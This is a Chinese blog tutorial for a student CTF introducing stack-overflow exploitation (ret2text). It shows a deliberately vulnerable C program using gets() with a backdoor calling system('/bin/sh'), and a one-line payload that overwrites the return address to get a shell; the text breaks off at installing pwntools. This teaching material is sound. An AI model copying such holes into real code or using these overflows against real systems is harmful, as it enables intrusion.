<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"archive.next.arttnba3.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是最容易进监狱的一个方向 预备知识作">
<meta property="og:type" content="article">
<meta property="og:title" content="post">
<meta property="og:url" content="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是最容易进监狱的一个方向 预备知识作">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png">
<meta property="og:image" content="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png">
<meta property="og:image" content="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png">
<meta property="og:image" content="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png">
<meta property="article:published_time" content="2020-09-17T14:19:20.000Z">
<meta property="article:modified_time" content="2020-11-17T14:22:04.138Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="信息安全">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="python">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ret2text">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png">

<link rel="canonical" href="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>post | arttnba3's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">arttnba3's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">- arttnba3的隐秘小窝 -</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/arttnba3" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="arttnba3">
      <meta itemprop="description" content="- 做了关于你的梦，所以不愿醒来呢 -">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="arttnba3's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          post
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-17 22:19:20" itemprop="dateCreated datePublished" datetime="2020-09-17T22:19:20+08:00">2020-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-17 22:22:04" itemprop="dateModified" datetime="2020-11-17T22:22:04+08:00">2020-11-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Pwn从入门到入狱"><a href="#Pwn从入门到入狱" class="headerlink" title="Pwn从入门到入狱"></a>Pwn从入门到入狱</h1><p>Copyright © 2020 arttnba3,XDSEC</p>
<h2 id="简介：什么是Pwn？"><a href="#简介：什么是Pwn？" class="headerlink" title="简介：什么是Pwn？"></a>简介：什么是Pwn？</h2><p><strong>Pwn</strong>这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即<strong>利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）</strong></p>
<p>Pwn也是最能代表<strong>原教旨主义黑客</strong>的一个安全研究方向<del>同时也是最容易进监狱的一个方向</del></p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>作为二进制安全的分支之一，Pwn需要你<strong>熟练掌握</strong>如下基础知识：</p>
<ul>
<li><strong>主流平台汇编语言，包括但不局限于X86、MIPS等</strong></li>
<li><strong>C语言</strong></li>
<li><strong>计算机组成原理</strong></li>
<li><strong>计算机操作系统</strong></li>
<li><strong>静态分析（IDA）&amp;动态调试（GDB）</strong></li>
<li><strong>Python</strong></li>
<li><strong>编译原理</strong></li>
<li><strong>……</strong></li>
</ul>
<p>看完你可能会感觉有一丶丶头大，不过少有人是先把计科专业本科的内容全部学完才开始学pwn的，大家都是<strong>一边比赛一边学习的</strong>，所以不用担心因为自己0基础导致无法入门的情况的发生</p>
<blockquote>
<p>CTF TO LEARN, NOT LEARN TO CTF</p>
</blockquote>
<h2 id="Pwn的解题过程？"><a href="#Pwn的解题过程？" class="headerlink" title="Pwn的解题过程？"></a>Pwn的解题过程？</h2><ol>
<li>题目的二进制文件一般会被部署到服务器上，使用<code>nc xx.xx.xx.xx(ip) xxxx(端口)</code>命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。</li>
<li>你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写<code>Exploit</code>(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的<code>flag文件或字符串</code>，将其提交至本平台。</li>
<li>注意命令行中的<code>nc</code>并不是做题工具，你需要在Linux下安装<code>pwntools</code>库（或者其它），用于编写可用性较高的<code>Exploit</code>。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~</li>
</ol>
<h2 id="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"><a href="#0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text" class="headerlink" title="0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"></a>0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</h2><blockquote>
<h4 id="前置知识要求："><a href="#前置知识要求：" class="headerlink" title="前置知识要求："></a>前置知识要求：</h4><ul>
<li>C语言基本语法</li>
<li>Python语言基本语法</li>
</ul>
<p>能大致看得懂C程序、有写简单的Python程序的能力即可</p>
<h4 id="前置环境要求："><a href="#前置环境要求：" class="headerlink" title="前置环境要求："></a>前置环境要求：</h4><ul>
<li><p>Windows</p>
</li>
<li><p>Linux</p>
</li>
</ul>
<p>我们的一部分工作需要在Windows上完成，另一部份工作则需要在Linux中完成</p>
<p>你可以在windows上运行Linux虚拟机，也可以直接在真机运行linux</p>
<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢</p>
<h4 id="百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度"><a href="#百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度" class="headerlink" title="百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度"></a>百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</h4><h4 id="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"><a href="#不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称" class="headerlink" title="不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"></a>不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</h4></blockquote>
<p>以下内容将通过几个样例简单地帮助你入门Pwn</p>
<h3 id="以下内容操作环境位于Linux："><a href="#以下内容操作环境位于Linux：" class="headerlink" title="以下内容操作环境位于Linux："></a>以下内容操作环境位于Linux：</h3><p>我们现在来看这样的一个程序：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"tell me your name plz:"</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用<code>-fno-stack-protector</code>、<code>-z norelro</code>、<code>-z execstack</code>、<code>-no-pie</code>这四条编译指令把这个程序的保护都给关掉</p>
<p><img src="https://i.loli.net/2020/09/19/VrEYoaTgXHztuek.png" alt="image.png"></p>
<h4 id="安全检查：checksec"><a href="#安全检查：checksec" class="headerlink" title="安全检查：checksec"></a>安全检查：checksec</h4><p><strong>使用<code>checksec</code>指令可以查看程序的保护开启情况</strong></p>
<p><img src="https://i.loli.net/2020/09/19/3V8ZP2kTlwjBArp.png" alt="image.png"></p>
<p>可以在控制台输入如下指令安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install checksec</span></span><br></pre></td></tr></table></figure>

<h4 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h4><p>这个程序做了些什么？</p>
<ul>
<li><p>定义了一个后门函数<code>backdoor()</code>，但是并未调用</p>
</li>
<li><p>分配了20个字节大小的内存空间给到char类型数组str</p>
</li>
<li><p>使用<code>gets()</code>函数从标准输入流读入字符串并写入数组str内</p>
</li>
</ul>
<p>我们可以看到当我们在编译时编译器<strong>给了一个警告</strong>，这是因为<strong>gets()函数并未限制读入的字符的数量，若是用户输入超过20个字符的数据，则会发生栈溢出，轻则会使程序崩溃，重则可能让不法分子获取系统的最高权限</strong></p>
<p>我们尝试着输入超过20个字节的字符串，看看会发生些什么：</p>
<p><img src="https://i.loli.net/2020/09/10/ImU7JcHr9j5DOS8.png" alt="image.png"></p>
<p>程序崩溃，提示<strong>Segmentation fault</strong>（<strong>段错误</strong>），即<strong>该程序尝试访问了不属于他的内存空间</strong></p>
<p>但是我们的程序执行流程明明很常规，代码里也没有任何的奇怪的操作，<strong>为什么输入不一样就会导致程序崩溃呢？</strong></p>
<h3 id="以下内容操作环境位于Windows："><a href="#以下内容操作环境位于Windows：" class="headerlink" title="以下内容操作环境位于Windows："></a>以下内容操作环境位于Windows：</h3><h4 id="IDA：逆向分析"><a href="#IDA：逆向分析" class="headerlink" title="IDA：逆向分析"></a>IDA：逆向分析</h4><p>通常情况下，我们所拿到的都是软件的发行版，而不是源代码，我们无法直接看出漏洞存在于哪个地方，故我们需要一个工具来尽可能地还原整个程序的运行过程，这就要借助到一个工具——<strong>IDA</strong></p>
<p>我们尝试使用<strong>IDA</strong>对程序进行<strong>逆向分析</strong></p>
<blockquote>
<p>注：IDA软件本体在moeCTF 2020群内有下载，你也可以选择通过搜索引擎获取一个IDA，或者直接在官网购买正版IDA</p>
</blockquote>
<p>当我们将程序拖入IDA后，除了我们自己写的<code>backdoor()</code>函数、<code>func()</code>函数及<code>main()</code>函数之外，我们可以看到IDA还解析出来很多奇奇怪怪的函数，</p>
<p><img src="https://i.loli.net/2020/09/19/PnyOMxVuwl2HkAp.png" alt="image.png"></p>
<p>这些预料之外的函数我们目前暂时不需要管（以后会学到的），我们目前只需要分析程序的主逻辑函数即可，双击main函数，我们便可以看到反汇编得到的汇编代码</p>
<p><img src="https://i.loli.net/2020/09/19/X9EqLPcvoRU7apQ.png" alt="image.png"></p>
<p>同样地，双击func函数我们也可以看到其原始的汇编代码</p>
<p><img src="https://i.loli.net/2020/09/19/fi49QwLhvb8jBKp.png" alt="image.png"></p>
<blockquote>
<h3 id="F5键：使用IDA进行逆向分析的神器"><a href="#F5键：使用IDA进行逆向分析的神器" class="headerlink" title="F5键：使用IDA进行逆向分析的神器"></a>F5键：使用IDA进行逆向分析的神器</h3><p>当我们选中一个函数时，我们可以按下F5键，将汇编代码反编译为C语言的代码，使我们能够更好的分析程序执行流程</p>
<p><img src="https://i.loli.net/2020/09/10/PKn45uGFCiALw9s.png" alt="image.png"></p>
<p>要注意的是<strong>不要完全依赖于F5键进行逆向分析，反编译出来的C语言代码不一定准确、易读，汇编代码的审计与程序的动态调试同样重要</strong></p>
<p>如：纯汇编编写的程序反编译出来的代码不知所云的情况常常出现</p>
<p><img src="https://i.loli.net/2020/09/10/H3pmFvzSZjVbR9A.png" alt="image.png"></p>
<p>如：C++程序很多时候逆出来就是一坨shit，没有强大的代码功底你很难搞明白程序究竟做了些什么，如下图（注释是我以前做这道题的时候手动打上的，可能有错，别深究Or2）</p>
<p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p>
</blockquote>
<p>push是什么？mov是什么？retn又是什么？他们都做了些什么？或许目前对于你而言这是完全陌生的一些东西，不过随着逐步深入的学习，你将会逐渐了解到其含义与作用</p>
<h3 id="以下内容操作环境位于Linux：-1"><a href="#以下内容操作环境位于Linux：-1" class="headerlink" title="以下内容操作环境位于Linux："></a>以下内容操作环境位于Linux：</h3><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p>为什么这个程序的汇编代码长这个样子？这就涉及到C函数调用的一个比较重要的概念——<strong>栈帧</strong>（<strong>Stack Frame</strong>）</p>
<blockquote>
<p>推荐阅读——《程序员的自我修养》第10章</p>
</blockquote>
<blockquote>
<p> 在讲栈帧之前，我们先简单地讲一讲什么是<strong>栈</strong></p>
<p> 在数据结构中，<strong>栈</strong>（<strong>stack</strong>）是一种受限线性表，在线性表上插入与删除数据的操作都只能在数据表的一端——栈顶进行操作，因此栈也是一种LIFO表（Last-in-First-out）</p>
<p> 在操作系统中，对动态内存的规划与使用是与数据结构中的栈相似的，我们称之为“栈内存”，用以存储函数内部（包括main函数）的局部变量和方法调用和函数参数值；栈内存是由系统自动分配的，一般速度较快；存储地址是连续且存在有限栈容量，会出现溢出现象程序可以将数据压入栈中，也可以将数据从栈顶弹出。压栈操作使得栈增大，而弹出操作使栈减小。 栈用于维护函数调用的上下文，离开了栈函数调用就没法实现。</p>
</blockquote>
<p>当程序每次进行函数调用的时候，都会在调用栈上维护一个独立的<strong>栈帧</strong>，用以储存属于这个函数的数据与基本信息，包括如下信息：</p>
<ul>
<li><strong>函数的返回地址和参数</strong></li>
<li><strong>临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量</strong></li>
</ul>
<p>想象如下一个空的栈：</p>
<p><strong>需要注意的是：在内存当中，栈是由高地址向低地址方向增长的</strong></p>
<p><img src="https://i.loli.net/2020/09/10/rpSL6osNhMKiY9u.png" alt="64E3FCC73EF02703BA8C857A91F96838.png"></p>
<p>这里引入一个新的概念——<strong>栈指针寄存器SP</strong>（<strong>Stack Pointer</strong>）与<strong>帧指针寄存器BP</strong>（<strong>Frame Pointer</strong>），这两个寄存器用以管理栈帧，其中<strong>SP寄存器永远指向栈顶，BP寄存器用以进行对栈内数据的访问</strong></p>
<p>当我们要调用一个函数时，首先会先<strong>将下一条的地址压入栈中，作为返回地址，这一步在原函数内完成</strong>，当函数执行流程结束后，程序会通过这个返回地址返回到该函数的上一层的调用地址</p>
<p>我们还是以刚刚反汇编出来的代码进行分析：</p>
<p>右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑</p>
<p><img src="https://i.loli.net/2020/09/19/1A5cH3GkKp6uYsb.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          &#x3D; byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; &#x2F;&#x2F; starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png" alt="52DF40089C8FCCF9D5CF8DE7211B73D8.png"></p>
<p>接下来就来到了我们看到的前两行汇编代码：<code>push rbp</code>与<code>mov rbp, rsp</code>，我们不难从指令的英文释义上知道其流程：</p>
<ul>
<li><strong>将bp寄存器的值压入栈中</strong></li>
<li><strong>将sp寄存器的值赋给bp寄存器</strong></li>
</ul>
<p><img src="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png" alt="9CF0F7F5A8DA1972F88EF480E4FB6271.png"></p>
<p>接下来的<code>sub rsp, 20h</code>指令的作用是<strong>开辟栈空间</strong>，处在sp与bp之间的这一块区域便用于储存数据</p>
<p><img src="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png" alt="A422C008B65723152D16FDDAD8421B38.png"></p>
<p>我们的<code>char str[20];</code>所占用的空间也在这里，同时我们可以发现我们<strong>虽然只分配了20个字节给str，但是程序却开辟了0x20个字节的数据，这是因为程序还要储存一些其他的数据</strong>（以后会学到）</p>
<p><img src="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png" alt="227643CB6A805274DA147132CC0413DE.png"></p>
<p>那么接下来就进入到我们对<code>gets()</code>函数的漏洞的利用过程了，由于其不限制我们输入的字符串的长度，我们可以<strong>将返回地址前面的数据全部填充</strong>（<strong>padding</strong>）<strong>掉，并将返回地址覆写为别的地址，改变程序的执行流程</strong></p>
<p><img src="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png" alt="AF0BBCCF20D852033C201460B566F5DA.png"></p>
<p>我们最终的目的是<strong>获取到shell</strong>，那么只要程序当中存在着<code>system(&quot;/bin/sh&quot;)</code>的函数调用，我们再将程序返回到其地址上，即可get shell</p>
<p>构造payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)		<span class="comment"># 别忘了8字节的rbp哟</span></span><br></pre></td></tr></table></figure>



<p>我们之前在程序当中写了一个<code>backdoor()</code>函数，其中包含有能够getshell的语句，同时我们在IDA中可以看到其地址为<code>0x400547</code></p>
<p><img src="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png" alt="image.png"></p>
<h4 id="攻击神器：pwntools"><a href="#攻击神器：pwntools" class="headerlink" title="攻击神器：pwntools"></a>攻击神器：pwntools</h4><p>接下来我们就需要考虑到如何将我们所构思出来的payload给输入到程序中了，那么这里我们就要用到一个对于每一位Pwner都十分重要的python库——<strong>pwntools</strong></p>
<blockquote>
<p>pwntools需要在<strong>Linux</strong>系统下使用（如Ubuntu、manjaro、kali等）</p>
<p>在shell中输入如下指令安装pwntools</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install pwntools</span></span><br></pre></td></tr></table></figure>
</blockquote>
